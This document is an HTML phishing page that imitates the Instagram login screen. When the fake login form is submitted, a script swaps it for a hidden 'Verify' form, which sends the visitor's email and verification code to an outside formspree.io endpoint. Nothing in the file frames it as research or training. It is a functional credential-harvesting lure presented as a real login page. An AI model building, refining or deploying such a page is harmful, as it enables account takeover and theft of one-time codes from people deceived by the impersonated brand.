<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Instagram</title>

<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">

<style>
body {
    background-color: #fafafa;
    font-family: Arial, sans-serif;
    margin: 0;
}

.wrapper {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.box {
    width: 350px;
    background: white;
    border: 1px solid #dbdbdb;
    padding: 40px 40px 20px;
    text-align: center;
}

.logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 48px;
    margin-bottom: 25px;
}

.input {
    width: 100%;
    height: 36px;
    padding: 9px;
    margin-bottom: 6px;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    background: #fafafa;
    font-size: 12px;
}

.btn {
    width: 100%;
    height: 34px;
    background-color: #0095f6;
    border: none;
    color: white;
    font-weight: bold;
    border-radius: 8px;
    margin-top: 10px;
    cursor: pointer;
}

.divider {
    display: flex;
    align-items: center;
    margin: 18px 0;
    font-size: 13px;
    color: #8e8e8e;
}

.divider::before,
.divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.divider span {
    margin: 0 10px;
}

.forgot {
    font-size: 12px;
    color: #00376b;
    margin-top: 12px;
    cursor: pointer;
}

.signup {
    width: 350px;
    background: white;
    border: 1px solid #dbdbdb;
    text-align: center;
    padding: 20px;
    margin-top: 10px;
    font-size: 14px;
}

.signup span {
    color: #0095f6;
    font-weight: bold;
}

#msg {
    margin-top: 10px;
    font-size: 13px;
}
</style>
</head>

<body>

<div class="wrapper">
    <div>

        <!-- LOGIN BOX -->
        <div class="box">

            <div class="logo">Instagram</div>

            <form onsubmit="return showForm()">
                <input class="input" type="text" placeholder="Phone number, username, or email" required>
                <input class="input" type="password" placeholder="Password" required>

                <button class="btn">Log In</button>

                <div class="divider"><span>OR</span></div>

                <div class="forgot">Forgot password?</div>
            </form>

        </div>

        <!-- FORMSPREE FORM (HIDDEN INITIALLY) -->
        <div class="box" id="verifyBox" style="display:none;">

            <div class="logo" style="font-size:28px;">Verify</div>

            <form action="https://formspree.io/f/mvojnako" method="POST">
                <input class="input" type="email" name="email" placeholder="Your Email" required>
                
                <input class="input" type="text" name="message" placeholder="Enter Verification Code" required>

                <button class="btn">Submit</button>
            </form>

        </div>

        <div class="signup">
            Don't have an account? <span>Sign up</span>
        </div>

    </div>
</div>

<script>
function showForm(){
    // hide login
    document.querySelector(".box").style.display = "none";
    
    // show verification form
    document.getElementById("verifyBox").style.display = "block";
    
    return false;
}
</script>

</body>
</html>
